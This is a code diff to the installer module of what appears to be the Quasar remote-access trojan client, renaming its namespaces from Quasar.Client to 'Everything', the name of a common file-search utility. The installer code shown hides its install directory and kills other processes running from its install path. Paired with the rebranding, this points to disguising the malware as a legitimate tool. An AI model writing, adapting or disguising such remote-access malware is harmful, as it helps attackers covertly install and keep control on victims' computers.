@@ -1,5 +1,5 @@
-﻿using Quasar.Client.Config;
-using Quasar.Client.Extensions;
+﻿using Everything.Config;
+using Everything.Extensions;
 using Quasar.Common.Helpers;
 using System;
 using System.Diagnostics;
@@ -7,7 +7,7 @@ using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Setup
+namespace Everything.Setup
 {
     public class ClientInstaller : ClientSetupBase
     {
@@ -35,7 +35,7 @@ namespace Quasar.Client.Setup
             {
                 try
                 {
-                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
+                    var di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
                     di.Attributes |= FileAttributes.Hidden;
                 }
                 catch (Exception ex)
@@ -49,9 +49,7 @@ namespace Quasar.Client.Setup
         {
             // create target dir
             if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
-            {
                 Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
-            }
 
             // delete existing file
             if (File.Exists(Settings.INSTALLPATH))
@@ -65,15 +63,17 @@ namespace Quasar.Client.Setup
                     if (ex is IOException || ex is UnauthorizedAccessException)
                     {
                         // kill old process running at destination path
-                        Process[] foundProcesses =
+                        var foundProcesses =
                             Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
-                        int myPid = Process.GetCurrentProcess().Id;
+                        var myPid = Process.GetCurrentProcess().Id;
                         foreach (var prc in foundProcesses)
                         {
                             // dont kill own process
-                            if (prc.Id == myPid) continue;
+                            if (prc.Id == myPid)
+                                continue;
                             // only kill the process at the destination path
-                            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH) continue;
+                            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH)
+                                continue;
                             prc.Kill();
                             Thread.Sleep(2000);
                             break;
